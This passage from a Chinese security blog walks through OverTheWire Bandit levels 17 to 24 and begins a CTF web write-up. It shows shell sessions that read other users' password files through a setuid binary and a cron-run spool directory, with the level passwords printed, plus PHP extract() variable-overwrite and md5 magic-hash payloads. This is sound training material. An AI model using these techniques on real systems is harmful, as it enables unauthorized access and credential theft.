class="line">bandit17@bandit:~$ cd /etc</span><br><span class="line">bandit17@bandit:/etc$ ls -a</span><br><span class="line">.                       inetd.conf       profile</span><br><span class="line">..                      inetd.d          profile.d</span><br><span class="line">adduser.conf            .info24.txt      protocols</span><br><span class="line">adjtime                 init             .pwd.lock</span><br><span class="line">alternatives            init.d           python</span><br><span class="line">apache2                 initramfs-tools  python2.7</span><br><span class="line">apm                     inittab          python3</span><br><span class="line">apparmor                inputrc          python3.5</span><br><span class="line">apparmor.d              insserv          rc0.d</span><br><span class="line">apt                     insserv.conf     rc1.d</span><br><span class="line">bandit_pass             insserv.conf.d   rc2.d</span><br><span class="line">bash.bashrc             iproute2         rc3.d</span><br><span class="line">bash_completion         issue            rc4.d</span><br><span class="line">bash_completion.d       issue.net        rc5.d</span><br><span class="line">bindresvport.blacklist  kernel           rc6.d</span><br><span class="line">ca-certificates         kernel-img.conf  rc.local</span><br><span class="line">ca-certificates.conf    ldap             rcS.d</span><br><span class="line">calendar                ld.so.cache      reportbug.conf</span><br><span class="line">ConsoleKit              ld.so.conf       resolv.conf</span><br><span class="line">console-setup           ld.so.conf.d     rmt</span><br><span class="line">cron.d                  libaudit.conf    rpc</span><br><span class="line">cron.daily              lighttpd         rsyslog.conf</span><br><span class="line">cron.hourly             locale.alias     rsyslog.d</span><br><span class="line">cron.monthly            locale.gen       screenrc</span><br><span class="line">crontab                 localtime        securetty</span><br><span class="line">cron.weekly             logcheck         security</span><br><span class="line">dbus-1                  login.defs       selinux</span><br><span class="line">debconf.conf            logrotate.conf   services</span><br><span class="line">debian_version          logrotate.d      sgml</span><br><span class="line">default                 ltrace.conf      shadow</span><br><span class="line">deluser.conf            lvm              shadow-</span><br><span class="line">devuan_version          magic            shells</span><br><span class="line">dhcp                    magic.mime       skel</span><br><span class="line">dictionaries-common     mailcap          ssh</span><br><span class="line">discover.conf.d         mailcap.order    ssl</span><br><span class="line">discover-modprobe.conf  manpath.config   staff-group-for-usr-local</span><br><span class="line">dpkg                    mime.types       subgid</span><br><span class="line">elogind                 mke2fs.conf      subgid-</span><br><span class="line">emacs                   modprobe.d       subuid</span><br><span class="line">environment             modules          subuid-</span><br><span class="line">firewall                motd             sudoers</span><br><span class="line">fstab                   mtab             sudoers.d</span><br><span class="line">gai.conf                Muttrc           supervisor</span><br><span class="line">gdb                     Muttrc.d         sysctl.conf</span><br><span class="line">groff                   nanorc           sysctl.d</span><br><span class="line">group                   network          systemd</span><br><span class="line">group-                  NetworkManager   terminfo</span><br><span class="line">grub.d                  networks         timezone</span><br><span class="line">gshadow                 newt             tmpfiles.d</span><br><span class="line">gshadow-                nsswitch.conf    ucf.conf</span><br><span class="line">gss                     ntp.conf         udev</span><br><span class="line">hdparm.conf             opt              ufw</span><br><span class="line">host.conf               os-release       update-motd.d</span><br><span class="line">hostname                pam.conf         vim</span><br><span class="line">hosts                   pam.d            wgetrc</span><br><span class="line">hosts.allow             passwd           X11</span><br><span class="line">hosts.deny              passwd-          xdg</span><br><span class="line">identd.conf             perl             xml</span><br><span class="line">identd.key              polkit-1</span><br><span class="line">这可以看到bandit_pass，不要想别的password，一步一步来</span><br><span class="line">bandit17@bandit:/etc$ cd bandit_pass/</span><br><span class="line">bandit17@bandit:/etc/bandit_pass$ ls -a</span><br><span class="line">.         bandit11  bandit16  bandit20  bandit25  bandit3   bandit4  bandit9</span><br><span class="line">..        bandit12  bandit17  bandit21  bandit26  bandit30  bandit5</span><br><span class="line">bandit0   bandit13  bandit18  bandit22  bandit27  bandit31  bandit6</span><br><span class="line">bandit1   bandit14  bandit19  bandit23  bandit28  bandit32  bandit7</span><br><span class="line">bandit10  bandit15  bandit2   bandit24  bandit29  bandit33  bandit8</span><br><span class="line">bandit17@bandit:/etc/bandit_pass$ cat bandit25</span><br><span class="line">cat: bandit25: Permission denied            //这里我以为会有权限配置错误导致后面很多pass能读，看来出题人还是很厉害</span><br><span class="line">bandit17@bandit:/etc/bandit_pass$ cat bandit17</span><br><span class="line">xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-17-18"><a href="#bandit-17-18" class="headerlink" title="bandit 17-18"></a>bandit 17-18</h2><p>Level Goal<br>There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new<br>NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19<br>这一关是要我们比较一下新旧密码两个文件的不同从而找出密码，这里会用到diff命令<br>diff<br>diff是Unix系统的一个很重要的工具程序。它用来比较两个文本文件的差异，是代码版本管理的基石之一。<br>diff使用格式</p>
<ol>
<li>（1）比较文件<br>[plain] view plain copy<br>diff filename_1 filename_2<br>diff filename_1 filename_2<br>（2）比较目录<br>[plain] view plain copy<br>diff dir_1 dir_2<br>diff dir_1 dir_2<br>diff命令常用的选项：<br>-b ——  忽略一行中的空字符的区别（例如“Hello World!!” 与 “Hello        World!!”认为是一样的）<br>-B —— 忽略空白行<br>-i —— 忽略大小写的不同<br>-r —— 如果diff后面接的目录时，会递归比较子目录中的文件不同<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bandit17@bandit:~$ ls -a</span><br><span class="line">.   .bandit16.password  .bashrc        passwords.old  .ssh</span><br><span class="line">..  .bash_logout        passwords.new  .profile</span><br><span class="line">bandit17@bandit:~$ diff passwords.new passwords.old</span><br><span class="line">42c42</span><br><span class="line">&lt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br><span class="line">---</span><br><span class="line">&gt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="bandit-18-19"><a href="#bandit-18-19" class="headerlink" title="bandit 18-19"></a>bandit 18-19</h2><p>Level Goal<br>The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.<br>Commands you may need to solve this level<br>ssh, ls, cat<br>这一关需要我们ssh连接读readme，但是设置了ssh一连就会断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh bandit18@bandit.labs.overthewire.org -p2220 ls</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line">bandit18@bandit.labs.overthewire.org&apos;s password: </span><br><span class="line">readme</span><br></pre></td></tr></table></figure><br>我们可以后面拼接命令试一下 看到ls可以执行<br>直接cat flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh bandit18@bandit.labs.overthewire.org -p2220 cat ./readme</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line">bandit18@bandit.labs.overthewire.org&apos;s password: </span><br><span class="line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-19-20"><a href="#bandit-19-20" class="headerlink" title="bandit 19-20"></a>bandit 19-20</h2><p>这一关比较复杂我直接用中文写：<br>要访问下一级别<br>您应该在homedirectory中使用setuid二进制文件。在没有参数的情况下执行它以找出如何使用它。<br>在使用setuid二进制文件后，可以在通常的位置（/ etc / bandit_pass）找到此级别的密码。<br>介绍一下setduid<br>什么是SetUID<br>我们知道，在linux的命令行下执行“ps -aux”命令时，就会列出当前系统中的所有进程，在其中可以看到每个进程都和用户的真实id关联，实际上，Linux中的每个进程还跟一个称为有效用户id（set User id）紧密关联。<br>前者用于表示该进程由那个用户控制，后者用于为新建立的文件分配所有权，检查文件访问许可等操作，同时有效用户为该文件的所有者。<br>linux系统内核允许一个进程以调用一个SetUID程序（或显示执行SetUID系统调用）的方式，来改变其自身的有效用户id。<br>更详细的可以看这里：<a href="https://blog.csdn.net/oo__yan/article/details/7076889" target="_blank" rel="noopener">https://blog.csdn.net/oo__yan/article/details/7076889</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bandit19@bandit:~$ ls -l</span><br><span class="line">total 8</span><br><span class="line">-rwsr-x--- 1 bandit20 bandit19 7296 Oct 16 14:00 bandit20-do</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do </span><br><span class="line">Run a command as another user.</span><br><span class="line">  Example: ./bandit20-do id</span><br><span class="line">  bandit19@bandit:~$ ./bandit20-do  id</span><br><span class="line">uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)</span><br><span class="line">我们看到这里euid是bandit20的，直接用他去读密码</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20</span><br><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-20-21"><a href="#bandit-20-21" class="headerlink" title="bandit 20-21"></a>bandit 20-21</h2><p>Level Goal<br>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).<br>NOTE: Try connecting to your own network daemon to see if it works as you think<br>Commands you may need to solve this level<br>ssh, nc, cat, bash, screen, tmux, Unix ‘job control’ (bg, fg, jobs, &amp;, CTRL-Z, …)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20&amp;</span><br><span class="line">[2] 7178</span><br><span class="line">bandit20@bandit:~$ ./suconnect 2333</span><br><span class="line">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br><span class="line">Password matches, sending next password</span><br><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br><span class="line">[2]+  Done                    nc -l -p 2333 &lt; /etc/bandit_pass/bandit20</span><br></pre></td></tr></table></figure><br>我监听了2333端口，随便哪个端口都可以。然后用suconnect连接上就ok</p>
<h2 id="bandit-21-22"><a href="#bandit-21-22" class="headerlink" title="bandit 21-22"></a>bandit 21-22</h2><p>Level Goal<br>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.<br>Commands you may need to solve this level<br>cron, crontab, crontab(5) (use “man 5 crontab” to access this)<br>需要我们在/etc/cron.d/中查找配置并查看正在执行的命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bandit21@bandit:~$ ls </span><br><span class="line">bandit21@bandit:~$ ls -a</span><br><span class="line">.  ..  .bash_logout  .bashrc  .prevpass  .profile</span><br><span class="line">bandit21@bandit:~$ cd /etc/cron.d</span><br><span class="line">bandit21@bandit:/etc/cron.d$ ls -a</span><br><span class="line">.  ..  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  .placeholder</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat ./cronjob_bandit22</span><br><span class="line">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cd /usr/bin/cronjob_bandit22.sh</span><br><span class="line">-bash: cd: /usr/bin/cronjob_bandit22.sh: Not a directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cd ./usr/bin/cronjob_bandit22.sh</span><br><span class="line">-bash: cd: ./usr/bin/cronjob_bandit22.sh: No such file or directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-22-23"><a href="#bandit-22-23" class="headerlink" title="bandit 22-23"></a>bandit 22-23</h2><p>Level Goal<br>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.<br>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.<br>Commands you may need to solve this level<br>cron, crontab, crontab(5) (use “man 5 crontab” to access this)<br>这一关还是需要我们在/etc/cron.d/中查找配置并查看正在执行的命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:~$ cd /etc/cron.d/</span><br><span class="line">bandit22@bandit:/etc/cron.d$ ls -a</span><br><span class="line">.  ..  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  .placeholder</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23</span><br><span class="line">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line">mytarget=$(echo I am user $myname | md5sum | cut -d &apos; &apos; -f 1)</span><br><span class="line"></span><br><span class="line">echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;</span><br><span class="line"></span><br><span class="line">cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>在这可以看到这个是被md5加密了，我们需要传入变量user bandit23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d &apos; &apos; -f 1</span><br><span class="line">8ca319486bfbbc3663ea0fbe81326349</span><br></pre></td></tr></table></figure><br>这个MD5就是一会儿需要需文件的文件名，接下来直接和上一关一样，cat /tmp/8ca319486bfbbc3663ea0fbe81326349就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</span><br><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-23-24"><a href="#bandit-23-24" class="headerlink" title="bandit 23-24"></a>bandit 23-24</h2><p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:~$ ls -a</span><br><span class="line">.  ..  .bash_logout  .bashrc  .profile</span><br><span class="line">bandit23@bandit:~$ cd /etc/bandit_pass/</span><br><span class="line">bandit23@bandit:/etc/bandit_pass$ ls</span><br><span class="line">bandit0   bandit13  bandit18  bandit22  bandit27  bandit31  bandit6</span><br><span class="line">bandit1   bandit14  bandit19  bandit23  bandit28  bandit32  bandit7</span><br><span class="line">bandit10  bandit15  bandit2   bandit24  bandit29  bandit33  bandit8</span><br><span class="line">bandit11  bandit16  bandit20  bandit25  bandit3   bandit4   bandit9</span><br><span class="line">bandit12  bandit17  bandit21  bandit26  bandit30  bandit5</span><br><span class="line">bandit23@bandit:/etc/bandit_pass$ cd -</span><br><span class="line">/home/bandit23</span><br><span class="line">bandit23@bandit:~$ cd /etc//cron.d</span><br><span class="line">bandit23@bandit:/etc/cron.d$ ls -l</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r-- 1 root root 120 Oct 16 14:00 cronjob_bandit22</span><br><span class="line">-rw-r--r-- 1 root root 122 Oct 16 14:00 cronjob_bandit23</span><br><span class="line">-rw-r--r-- 1 root root 120 Oct 16 14:00 cronjob_bandit24</span><br><span class="line">bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24</span><br><span class="line">@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">myname=$(whoami)</span><br><span class="line">cd /var/spool/$myname</span><br><span class="line">echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;</span><br><span class="line">for i in * .*;</span><br><span class="line">do</span><br><span class="line">    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];</span><br><span class="line">    then</span><br><span class="line">  echo &quot;Handling $i&quot;</span><br><span class="line">  timeout -s 9 60 ./$i</span><br><span class="line">  rm -f ./$i</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>我们需要写一个shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:/tmp$ mkdir bobo1</span><br><span class="line">bandit23@bandit:/tmp$ cd bobo1</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ chmod 777 /tmp/bobo1</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ vi 1.sh</span><br><span class="line">这里创建我们需要写的脚本，内容如下：</span><br><span class="line">#!/bin/bash</span><br><span class="line">cat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/bobo1/pass</span><br><span class="line"></span><br><span class="line">bandit23@bandit:~$ cd /tmp/bobo1</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ chmod 777 1.sh</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ cp 1.sh /var/spool/bandit24/</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ cat pass</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/24/yushang/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/24/yushang/" itemprop="url">豫商杯web的WP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-24T10:29:41+08:00">
                2018-10-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><h3 id="1-variable-–提示：something-about-php"><a href="#1-variable-–提示：something-about-php" class="headerlink" title="1.variable –提示：something about php"></a>1.variable –提示：something about php</h3><p><a href="http://ctf3.shiyanbar.com/web/variable/" target="_blank" rel="noopener">http://ctf3.shiyanbar.com/web/variable/</a><br>打开题目发现<br><img src="/2018/10/24/yushang/1.jpg" alt=" "><br>源码可以下载下来，于是我们下载源码打开<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;secret.php&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;The Ducks&lt;/title&gt;</span><br><span class="line">        &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line">        &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js&quot; integrity=&quot;sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class="line">                &lt;center&gt;</span><br><span class="line">                    &lt;h1&gt;The Ducks&lt;/h1&gt;</span><br><span class="line">                    &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</span><br><span class="line">                        &lt;?php</span><br><span class="line">                        extract($_POST);</span><br><span class="line">                        if ($pass == $thepassword_123) &#123; ?&gt;</span><br><span class="line">                            &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;?php &#125; ?&gt;</span><br><span class="line">                    &lt;?php &#125; ?&gt;</span><br><span class="line">                    &lt;form action=&quot;.&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;col-md-6 col-md-offset-3&quot;&gt;</span><br><span class="line">                                &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;col-md-9&quot;&gt;</span><br><span class="line">                                        &lt;input type=&quot;password&quot; class=&quot;form-control&quot; name=&quot;pass&quot; placeholder=&quot;Password&quot; /&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;div class=&quot;col-md-3&quot;&gt;</span><br><span class="line">                                        &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/center&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;p&gt;</span><br><span class="line">                &lt;center&gt;</span><br><span class="line">                    source at &lt;a href=&quot;source.phps&quot; target=&quot;_blank&quot;&gt;/source.php&lt;/a&gt;</span><br><span class="line">                &lt;/center&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>定位到关键函数：extract()<br>这个函数通过百度我们可以知道：extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</p>
<p>于是看到关键代码<code>if ($pass == $thepassword_123)</code>这里可以用变量覆盖，重新post两个相同名字不同值的变量上去就可以覆盖<br>payload：<code>http://ctf3.shiyanbar.com/web/variable/</code><br>需要post的数据：<code>pass=123&amp;thepassword_123=123</code><br><code>flag{f1c6edcdc3f1c291eea3f266600439aa}</code></p>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><h3 id="2-md5-–提示：md5算法的漏洞？"><a href="#2-md5-–提示：md5算法的漏洞？" class="headerlink" title="2.md5 –提示：md5算法的漏洞？"></a>2.md5 –提示：md5算法的漏洞？</h3><p><a href="http://ctf3.shiyanbar.com/web/md5/" target="_blank" rel="noopener">http://ctf3.shiyanbar.com/web/md5/</a><br>打开看到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">please input a</span><br><span class="line">source code:</span><br><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&quot;QNKCDZO&quot;);</span><br><span class="line">$a = @$_GET[&quot;a&quot;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &quot;QNKCDZO&quot; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    echo &quot;flag&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>直接想到php黑魔法：和<code>QNKCDZO</code>MD5相等的数是<code>240610708</code><br>payload：<a href="http://ctf3.shiyanbar.com/web/md5/?a=240610708" target="_blank" 